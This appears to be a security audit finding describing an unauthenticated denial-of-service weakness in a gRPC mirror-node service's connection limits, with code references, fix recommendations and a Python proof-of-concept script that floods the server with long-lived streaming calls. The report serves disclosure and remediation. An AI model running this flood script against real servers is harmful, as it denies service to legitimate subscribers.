### Title
Unauthenticated Unbounded Connection Multiplication Exhausts gRPC Thread Pool, Causing Topic Message Delivery DoS

### Summary
`grpcServerConfigurer()` configures only a per-connection call limit (`maxConcurrentCallsPerConnection = 5`) but sets no global connection limit and registers no authentication or authorization interceptor. An unprivileged attacker can open an unbounded number of TCP connections, each carrying 5 concurrent streaming calls, multiplying total concurrent calls without bound and saturating the shared `applicationTaskExecutor` thread pool. This starves legitimate subscribers of Hedera Consensus Service (HCS) topic messages, causing sustained delivery failure.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** `maxConcurrentCallsPerConnection` is scoped *per connection*. No call to `serverBuilder.maxConnectionAge(...)`, `serverBuilder.maxConnections(...)`, or any equivalent is made. No authentication `ServerInterceptor` is registered — the only registered interceptor (`grpc/src/test/java/org/hiero/mirror/grpc/interceptor/GrpcInterceptor.java`) only sets an `EndpointContext` for table-usage tracking and passes every call through unconditionally. The `NettyProperties` class exposes only `maxConcurrentCallsPerConnection`; there is no `maxConnections` or IP-rate-limit field.

**Exploit flow:**
1. Attacker opens `N` TCP connections to port 5600 (no credentials required).
2. On each connection, attacker opens 5 concurrent `subscribeTopic` streaming RPCs (the per-connection limit).
3. Total active server-side calls = `N × 5`, all dispatched to the shared `applicationTaskExecutor`.
4. Once the executor's thread pool is saturated, new calls from legitimate clients queue indefinitely or are rejected.
5. Attacker holds streams open (streaming RPCs are long-lived by design for HCS subscriptions), preventing thread reclamation.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection = 5` caps calls per connection, not globally. Opening more connections trivially bypasses it.
- No `maxConnections` is configured on `NettyServerBuilder`, so Netty accepts connections up to OS file-descriptor limits.
- No authentication interceptor exists in the gRPC layer to reject or throttle unauthenticated callers.

### Impact Explanation
The gRPC service is the sole delivery path for HCS topic message subscriptions. Thread pool exhaustion causes all legitimate subscriber streams to stall — messages are queued in the listener buffer (`maxBufferSize = 16384`) but never dispatched to clients. Sustained exhaustion constitutes a complete DoS of the HCS subscription API. The `applicationTaskExecutor` is shared, so exhaustion can also degrade other Spring-managed async work on the same pod.

### Likelihood Explanation
Preconditions: none. The attacker needs only network access to port 5600 and a standard gRPC client library. Opening thousands of TCP connections and 5 streaming calls each is trivially scriptable in any language with a gRPC library. The attack is repeatable, requires no credentials, no prior knowledge of topics, and can be sustained indefinitely since streaming RPCs are designed to be long-lived. A single attacker machine with sufficient file descriptors can execute this.

### Recommendation
1. **Add a global connection limit** in `grpcServerConfigurer()`:
   ```java
   serverBuilder.maxConnectionAge(duration, TimeUnit.SECONDS);
   serverBuilder.maxConnectionIdle(duration, TimeUnit.SECONDS);
   ```
   And add `maxConnections` to `NettyProperties` with a safe default (e.g., 1000), then call `serverBuilder.maxConnections(nettyProperties.getMaxConnections())`.

2. **Add a per-IP connection rate-limit interceptor** or deploy an L4/L7 proxy (e.g., Envoy) in front of the gRPC port with connection-rate and concurrent-stream limits per source IP.

3. **Add `maxConcurrentCallsPerConnection` to a global cap** by tracking total active calls across all connections in a `ServerInterceptor` and rejecting new calls with `RESOURCE_EXHAUSTED` when the global limit is reached.

### Proof of Concept
```python
import grpc
import threading
from proto import consensus_service_pb2, consensus_service_pb2_grpc, mirror_network_service_pb2

TARGET = "grpc-mirror-node:5600"
CONNECTIONS = 500   # open 500 TCP connections
CALLS_PER_CONN = 5  # per-connection limit

def flood_connection():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    threads = []
    for _ in range(CALLS_PER_CONN):
        req = consensus_service_pb2.ConsensusTopicQuery(
            topic_id=mirror_network_service_pb2.TopicID(topic_num=1)
        )
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(req)))
        t.daemon = True
        t.start()
        threads.append(t)
    # hold open indefinitely
    for t in threads:
        t.join()

threads = [threading.Thread(target=flood_connection) for _ in range(CONNECTIONS)]
for t in threads:
    t.start()
# Result: 500 * 5 = 2500 concurrent server-side streaming calls
# applicationTaskExecutor saturated; legitimate subscribers receive no messages
```

Expected result: legitimate `subscribeTopic` calls from other clients time out or receive no messages while the flood is active.
